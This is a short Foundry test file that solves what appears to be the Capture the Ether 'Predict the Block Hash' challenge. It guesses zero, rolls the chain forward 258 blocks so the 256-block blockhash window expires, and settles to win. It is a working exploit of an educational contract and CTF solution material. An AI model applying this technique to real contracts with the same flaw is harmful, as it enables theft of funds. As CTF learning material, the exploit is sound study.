// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./PredictTheBlockHashChallenge.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    PredictTheBlockHashChallenge challenge;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        vm.deal(playerAddr, 1 ether);
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        challenge.lockInGuess{value: 1 ether}(bytes32(0));
        // x := block.number in lockInGuess()
        // y := block.number in settle()
        // x + 1 : settlementBlockNumber
        // blockhash(y - 256) : not 0
        // blockhash(y - 257) : 0
        // condition: x + 1 = y - 257
        // y = x + 258
        vm.roll(block.number + 258);
        challenge.settle();

        vm.stopPrank();
        assertTrue(challenge.isComplete(), "Challenge is not complete");
    }
}
